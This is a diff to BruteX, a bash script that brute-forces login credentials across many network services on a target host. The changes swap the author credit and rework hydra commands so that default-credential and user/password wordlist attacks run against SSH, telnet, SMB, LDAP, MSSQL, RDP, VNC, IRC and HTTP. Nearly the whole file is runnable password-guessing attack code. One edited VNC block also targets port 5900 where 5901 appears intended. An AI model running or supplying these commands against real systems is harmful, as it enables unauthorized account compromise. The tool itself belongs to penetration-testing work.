@@ -1,6 +1,6 @@
 #!/bin/bash 
-# BruteX by 1N3
-# http://crowdshield.com
+# BruteX by @xer0dayz
+# http://xerosecurity.com
 #
 # ABOUT:
 # BruteX is a simple bash script used to brute force all services on a target.
@@ -22,17 +22,16 @@ LOOT_DIR=/usr/share/brutex/loot
 FTP_USER_PASS="/usr/share/brutex/wordlists/ftp-default-userpass.txt"
 SSH_USER_PASS="/usr/share/brutex/wordlists/ssh-default-userpass.txt"
 TELNET_USER_PASS="/usr/share/brutex/wordlists/telnet-default-userpass.txt"
-MYSQL_USER_PASS="/usr/share/brutex/wordlists/mysql-default-userpass.txt"
 MSSQL_USER_PASS="/usr/share/brutex/wordlists/mssql-default-userpass.txt"
+MYSQL_USER_PASS="/usr/share/brutex/wordlists/mysql-default-userpass.txt"
 ORACLE_USER_PASS="/usr/share/brutex/wordlists/oracle-default-userpass.txt"
 POSTGRES_USER_PASS="/usr/share/brutex/wordlists/postgres-default-userpass.txt"
 WINDOWS_USER_LIST="/usr/share/brutex/wordlists/windows-users.txt"
-WINDOWS_USER_FILE="/usr/share/brutex/wordlists/windows-default-userpass.txt"
-TOMCAT_USER_PASS="/usr/share/brutex/wordlists/tomcat-default-userpass.txt"
-VNC_USER_PASS="/usr/share/brutex/wordlists/vnc-default-passwords.txt"
+WINDOWS_USER_PASS="/usr/share/brutex/wordlists/windows-default-userpass.txt"
 USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
 PASS_FILE="/usr/share/brutex/wordlists/password.lst"
 SNMP_FILE="/usr/share/brutex/wordlists/snmp-strings.txt"
+VNC_FILE="/usr/share/brutex/wordlists/vnc-default-passwords.txt"
 HTTP_LOCATION="/"
 THREADS="1"
 COLOR1='\033[91m'
@@ -51,8 +50,8 @@ if [ -z $TARGET ]; then
 	echo -e "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $RESET"
 	echo -e "$COLOR1         \/                         \/      \_/$RESET"
 	echo ""
-	echo -e "$COLOR1 + -- --=[BruteX v$VER by 1N3$RESET"
-	echo -e "$COLOR1 + -- --=[http://crowdshield.com$RESET"
+	echo -e "$COLOR1 + -- --=[BruteX v$VER by @xer0dayz$RESET"
+	echo -e "$COLOR1 + -- --=[https://xerosecurity.com$RESET"
 	echo -e "$COLOR1 + -- --=[Usage: brutex <target> <port>"
 	echo -e "$RESET"
 	exit
@@ -67,8 +66,8 @@ echo -e "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $RESET"
 echo -e "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $RESET"
 echo -e "$COLOR1         \/                         \/      \_/$RESET"
 echo ""
-echo -e "$COLOR1 + -- --=[BruteX v$VER by 1N3$RESET"
-echo -e "$COLOR1 + -- --=[http://crowdshield.com$RESET"
+echo -e "$COLOR1 + -- --=[BruteX v$VER by @xer0dayz$RESET"
+echo -e "$COLOR1 + -- --=[http://xerosecurity.com$RESET"
 echo ""
 echo ""
 
@@ -122,6 +121,7 @@ then
 else
 	echo -e "$COLOR2 + -- --=[Port 22 opened... running tests...$RESET"
 	hydra -C $SSH_USER_PASS $TARGET ssh -t $THREADS -e ns
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -t $THREADS -e ns
 fi
 
 if [ -z "$port_23" ]
@@ -130,6 +130,7 @@ then
 else
 	echo -e "$COLOR2 + -- --=[Port 23 opened... running tests...$RESET"
 	hydra -C $TELNET_USER_PASS $TARGET telnet -t $THREADS -e ns
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -t $THREADS -e ns
 fi
 
 if [ -z "$port_25" ]
@@ -162,7 +163,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 139 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 139 opened... running tests...$RESET"
-	hydra -C $WINDOWS_USER_FILE $TARGET smb -S 139 -t $THREADS -e ns
+	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET smb -S 139 -t $THREADS -e ns
 fi
 
 if [ -z "$port_162" ]
@@ -170,7 +171,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 162 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 162 opened... running tests...$RESET"
-	hydra -L $SNMP_FILE -P $SNMP_FILE snmp -S 162 -t $THREADS -e ns
+	hydra -P $SNMP_FILE snmp -S 162 -t $THREADS -e ns
 fi
 
 if [ -z "$port_389" ]
@@ -178,8 +179,8 @@ then
 	echo -e "$COLOR1 + -- --=[Port 389 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 389 opened... running tests...$RESET"
-	hydra -C $WINDOWS_USER_FILE $TARGET ldap2 -S 389 -t $THREADS -e ns
-	hydra -C $WINDOWS_USER_FILE $TARGET ldap3 -S 389 -t $THREADS -e ns
+	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET ldap2 -S 389 -t $THREADS -e ns
+	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET ldap3 -S 389 -t $THREADS -e ns
 fi
 
 if [ -z "$port_443" ]
@@ -195,7 +196,8 @@ then
 	echo -e "$COLOR1 + -- --=[Port 445 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 445 opened... running tests...$RESET"
-	hydra -C $WINDOWS_USER_FILE $TARGET smb -S 445 -t $THREADS -e ns 
+	hydra -C $WINDOWS_USER_PASS $TARGET smb -S 445 -t $THREADS -e ns
+	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET smb -S 445 -t $THREADS -e ns 
 fi
 
 if [ -z "$port_512" ]
@@ -203,7 +205,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 512 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 512 opened... running tests...$RESET"
-	hydra -C $SSH_USER_PASS $TARGET rexec -S 512 -t $THREADS -e ns 
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET rexec -S 512 -t $THREADS -e ns 
 fi
 
 if [ -z "$port_513" ]
@@ -211,7 +213,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 513 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 513 opened... running tests...$RESET"
-	hydra -C $SSH_USER_PASS $TARGET rlogin -S 513 -t $THREADS -e ns 
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET rlogin -S 513 -t $THREADS -e ns 
 fi
 
 if [ -z "$port_514" ]
@@ -219,7 +221,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 514 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 514 opened... running tests...$RESET"
-	hydra -C $SSH_USER_PASS $TARGET rsh -S 514 -t $THREADS -e ns 
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET rsh -S 514 -t $THREADS -e ns 
 fi
 
 if [ -z "$port_993" ]
@@ -235,7 +237,8 @@ then
 	echo -e "$COLOR1 + -- --=[Port 1433 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 1433 opened... running tests...$RESET"
-	hydra -C $MSSQL_USER_PASS $TARGET mssql -S 1433 -t $THREADS -e ns 
+	hydra -C $MSSQL_USER_PASS $TARGET mssql -S 1433 -t $THREADS -e ns
+	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET mssql -S 1433 -t $THREADS -e ns 
 fi
 
 if [ -z "$port_1521" ]
@@ -259,7 +262,8 @@ then
 	echo -e "$COLOR1 + -- --=[Port 3389 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 3389 opened... running tests...$RESET"
-	hydra -C $WINDOWS_USER_FILE $TARGET rdp -t $THREADS -e ns
+	hydra -C $WINDOWS_USER_PASS $TARGET rdp -t $THREADS -e ns
+	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET rdp -t $THREADS -e ns
 fi
 
 if [ -z "$port_5432" ]
@@ -275,7 +279,8 @@ then
 	echo -e "$COLOR1 + -- --=[Port 5900 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 5900 opened... running tests...$RESET"
-	hydra -C $VNC_USER_PASS $TARGET vnc -S 5900 -t $THREADS -e ns
+	hydra -P $VNC_FILE $TARGET vnc -S 5900 -t $THREADS -e ns
+	hydra -P $PASS_FILE $TARGET vnc -S 5900 -t $THREADS -e ns
 fi
 
 if [ -z "$port_5901" ]
@@ -283,7 +288,16 @@ then
 	echo -e "$COLOR1 + -- --=[Port 5901 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 5901 opened... running tests...$RESET"
-	hydra -C $VNC_USER_PASS $TARGET vnc -S 5901 -t $THREADS -e ns
+	hydra -P $VNC_FILE $TARGET vnc -S 5900 -t $THREADS -e ns
+	hydra -P $PASS_FILE $TARGET vnc -S 5901 -t $THREADS -e ns
+fi
+
+if [ -z "$port_6667" ]
+then
+	echo -e "$COLOR1 + -- --=[Port 6667 closed... skipping.$RESET"
+else
+	echo -e "$COLOR2 + -- --=[Port 6667 opened... running tests...$RESET"
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET irc -s 6667 -t $THREADS -e ns
 fi
 
 if [ -z "$port_8000" ]
@@ -299,7 +313,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 8080 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 8080 opened... running tests...$RESET"
-	hydra -C $TOMCAT_USER_PASS $TARGET http-head -S 8080 -f -q -t $THREADS -e ns -m /
+	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -S 8080 -f -q -t $THREADS -e ns -m /
 fi
 
 if [ -z "$port_8100" ]
@@ -308,14 +322,6 @@ then
 else
 	echo -e "$COLOR2 + -- --=[Port 8100 opened... running tests...$RESET"
 	hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -S 8100 -f -q -t $THREADS -e ns -m /
-fi
-
-if [ -z "$port_6667" ]
-then
-	echo -e "$COLOR1 + -- --=[Port 6667 closed... skipping.$RESET"
-else
-	echo -e "$COLOR2 + -- --=[Port 6667 opened... running tests...$RESET"
-	hydra -L $USER_FILE -P $PASS_FILE $TARGET irc -s 6667 -t $THREADS -e ns
 fi
 
 echo ""
